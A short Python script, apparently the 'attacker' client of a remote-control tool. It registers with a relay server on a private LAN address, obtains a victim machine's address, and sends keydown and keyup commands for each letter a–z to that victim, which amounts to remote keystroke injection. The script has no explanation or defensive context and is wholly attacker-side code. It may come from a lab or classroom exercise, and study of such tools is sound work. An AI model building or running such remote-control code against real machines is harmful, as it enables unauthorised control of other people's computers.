import socket
import time

client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
client.sendto("attacker".encode(), ("192.168.1.240", 8200))
time.sleep(3)
client.sendto("choice0".encode(), ("192.168.1.240", 8200))
a = client.recvfrom(1024)[0].decode()
print(a)
c, ip_of_victim = client.recvfrom(1024)
print(c)

for i in range(ord('a'), ord('z') + 1):
    client.sendto(f'kd{chr(i)}'.encode(), ip_of_victim)
    client.sendto(f'ku{chr(i)}'.encode(), ip_of_victim)

client.sendto("attacker exit".encode(), ("192.168.1.240", 8200))
client.close()